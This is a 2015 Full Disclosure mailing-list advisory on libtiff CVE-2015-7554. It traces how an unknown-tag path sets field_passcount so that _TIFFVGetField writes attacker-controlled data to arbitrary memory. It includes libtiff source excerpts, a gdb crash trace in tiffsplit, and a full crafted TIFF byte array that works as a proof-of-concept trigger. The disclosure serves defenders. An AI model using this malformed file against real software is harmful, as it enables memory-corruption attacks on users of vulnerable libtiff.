@@ -1,0 +1,222 @@
+
+Date: Sat, 26 Dec 2015 23:34:40 +0700
+From: Hans Jerry Illikainen <hji@...topia.com>
+To: bugtraq@...urityfocus.com, fulldisclosure@...lists.org,
+ oss-security@...ts.openwall.com
+Subject: [FD] libtiff: invalid write (CVE-2015-7554)
+
+
+`_TIFFVGetField()' in libtiff-4.0.6 may write field data for certain
+extension tags to invalid or possibly arbitrary memory.
+
+Each tag has a `field_passcount' variable in their TIFFField struct:
+
+tiff-4.0.6/libtiff/tif_dir.h #276..289:
+,----
+| struct _TIFFField {
+|     uint32 field_tag;                       /* field's tag */
+|     short field_readcount;                  /* read count/TIFF_VARIABLE/TIFF_SPP */
+|     short field_writecount;                 /* write count/TIFF_VARIABLE */
+|     TIFFDataType field_type;                /* type of associated data */
+|     uint32 reserved;                        /* reserved for future extension */
+|     TIFFSetGetFieldType set_field_type;     /* type to be passed to TIFFSetField */
+|     TIFFSetGetFieldType get_field_type;     /* type to be passed to TIFFGetField */
+|     unsigned short field_bit;               /* bit in fieldsset bit vector */
+|     unsigned char field_oktochange;         /* if true, can change while writing */
+|     unsigned char field_passcount;          /* if true, pass dir count on set */
+|     char* field_name;                       /* ASCII name */
+|     TIFFFieldArray* field_subfields;        /* if field points to child ifds, child ifd field definition array */
+| };
+`----
+
+For example:
+
+tiff-4.0.6/libtiff/tif_fax3.c #1139..1141:
+,----
+| static const TIFFField fax3Fields[] = {
+|     { TIFFTAG_GROUP3OPTIONS, 1, 1, TIFF_LONG, 0, TIFF_SETGET_UINT32, TIFF_SETGET_UINT32, FIELD_OPTIONS, FALSE, FALSE, "Group3Options", NULL },
+| };
+`----
+
+However, `field_passcount' is always assigned TRUE if the tag is
+processed by `_TIFFCreateAnonField()'.  This happens on unsuccessful
+invocations of `TIFFReadDirectoryFindFieldInfo()':
+
+tiff-4.0.6/libtiff/tif_dirread.c #3396..4076:
+,----
+| int
+| TIFFReadDirectory(TIFF* tif)
+| {
+| [...]
+|             TIFFReadDirectoryFindFieldInfo(tif,dp->tdir_tag,&fii);
+|             if (fii == FAILED_FII)
+|             {
+|                 TIFFWarningExt(tif->tif_clientdata, module,
+|                                "Unknown field with tag %d (0x%x) encountered",
+|                                dp->tdir_tag,dp->tdir_tag);
+|                 /* the following knowingly leaks the
+|                    anonymous field structure */
+|                 if (!_TIFFMergeFields(tif,
+|                                       _TIFFCreateAnonField(tif,
+|                                           dp->tdir_tag,
+|                                           (TIFFDataType) dp->tdir_type),
+|                                       1)) {
+| [...]
+| }
+`----
+
+tiff-4.0.6/libtiff/tif_dirinfo.c #627..719:
+,----
+| TIFFField*
+| _TIFFCreateAnonField(TIFF *tif, uint32 tag, TIFFDataType field_type)
+| {
+|     [...]
+|     fld->field_bit = FIELD_CUSTOM;
+|     [...]
+|     fld->field_passcount = TRUE;
+|     [...]
+| }
+`----
+
+If the field for a 1-count extension tag whose `field_passcount' has
+been overridden is later read by `_TIFFVGetField()', this happens:
+
+tiff-4.0.6/libtiff/tif_dir.c #823..1145:
+,----
+| static int
+| _TIFFVGetField(TIFF* tif, uint32 tag, va_list ap)
+| {
+|     [...]
+|     uint32 standard_tag = tag;
+|     [...]
+|     if (fip->field_bit == FIELD_CUSTOM) {
+|         standard_tag = 0;
+|     }
+| 
+|     switch (standard_tag) {
+|         [...]
+|         default:
+|         {
+|             [...]
+|             for (i = 0; i < td->td_customValueCount; i++) {
+|                 [...]
+|                 if (fip->field_passcount) {
+|                     if (fip->field_readcount == TIFF_VARIABLE2)
+|                         *va_arg(ap, uint32*) = (uint32)tv->count;
+|                     else  /* Assume TIFF_VARIABLE */
+|                         *va_arg(ap, uint16*) = (uint16)tv->count;
+|                     *va_arg(ap, void **) = tv->value;
+|                     ret_val = 1;
+|                 }
+|                 [...]
+|             }
+|         }
+|     }
+|     [...]
+| }
+`----
+
+
+With an invocation of `TIFFGetField()' such as:
+
+,----
+| TIFFGetField(tif, TIFFTAG_GROUP3OPTIONS, &dst);
+`----
+
+for a TIFFTAG_GROUP3OPTIONS specified as:
+
+,----
+| 0x24, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41
+| ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^
+| tag         type        count                   offset/value
+`----
+
+the count is written to `dst', whereas 0x41414141 is written to
+invalid/arbitrary memory.
+
+
+Using the included tiffsplit utility as an example:
+
+tiff-4.0.6/tools/tiffsplit.c #157..228:
+,----
+| static int
+| tiffcp(TIFF* in, TIFF* out)
+| {
+|     [...]
+|     CopyField(TIFFTAG_YRESOLUTION, floatv);
+|     CopyField(TIFFTAG_GROUP3OPTIONS, longv);
+|     [...]
+| }
+`----
+
+,----
+| $ gdb -q --args tiffsplit tag.tiff
+| Reading symbols from tiffsplit...done.
+| (gdb) r
+| TIFFReadDirectory: Warning, Unknown field with tag 292 (0x124) encountered.
+| 
+| Program received signal SIGSEGV, Segmentation fault.
+| 0xb7f68155 in _TIFFVGetField (tif=0x804d008, tag=292, ap=0xbffff660 "\024\367\377\277\210\366\377\277\200\366\377\277\067\206\004\b0\371\377\267") at tif_dir.c:1056
+| 1056                            *va_arg(ap, void **) = tv->value;
+| (gdb) x/i $eip
+| => 0xb7f68155 <_TIFFVGetField+2229 at tif_dir.c:1056>:	mov    %edx,(%eax)
+| (gdb) x/x $edx
+| 0x804d670:	0x41414141
+| (gdb) x/x $eax
+| 0x41410000:	Cannot access memory at address 0x41410000
+| (gdb)
+`----
+
+
+tag.tiff:
+,----
+| unsigned char tiff[] = {
+|     /* little-endian */
+|     0x49, 0x49,
+| 
+|     /* version */
+|     0x2a, 0x00,
+| 
+|     /* tif->tif_diroff */
+|     0x09, 0x00, 0x00, 0x00,
+|     0x00,
+| 
+|     /* tag count */
+|     0x07, 0x00,
+| 
+|     /* tag    | type      | count                 | offset/value         */
+|     /* TIFFTAG_IMAGEWIDTH */
+|     0x00, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+|     /* TIFFTAG_IMAGELENGTH */
+|     0x01, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+|     /* TIFFTAG_BITSPERSAMPLE */
+|     0x02, 0x01, 0x03, 0x00, 0x03, 0x00, 0x00, 0x00, 0x63, 0x00, 0x00, 0x00,
+|     /* TIFFTAG_STRIPOFFSETS */
+|     0x11, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+|     /* TIFFTAG_STRIPBYTECOUNTS */
+|     0x17, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
+|     /* TIFFTAG_YRESOLUTION */
+|     0x1b, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22, 0x00,
+|     /* TIFFTAG_GROUP3OPTIONS */
+|     0x24, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41,
+| 
+|     /* tif->tif_nextdiroff */
+|     0x00, 0x00, 0x00, 0x00,
+| 
+|     /* bits per sample */
+|     0x08, 0x00,
+|     0x08, 0x00,
+|     0x08, 0x00,
+| };
+`----
+
+
+This issue has been assigned CVE-2015-7554 and it has yet to be fixed.
+
+-- 
+Hans Jerry Illikainen
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
